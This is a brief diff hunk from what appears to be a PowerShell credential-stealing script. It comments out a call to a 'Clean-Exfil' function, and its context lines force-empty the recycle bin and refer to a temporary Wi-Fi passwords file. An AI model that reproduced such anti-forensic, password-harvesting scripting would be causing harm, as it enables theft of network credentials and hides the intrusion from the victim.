@@ -79,7 +79,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
-if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+#if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
 #RI $env:TEMP/--wifi-passwords.txt
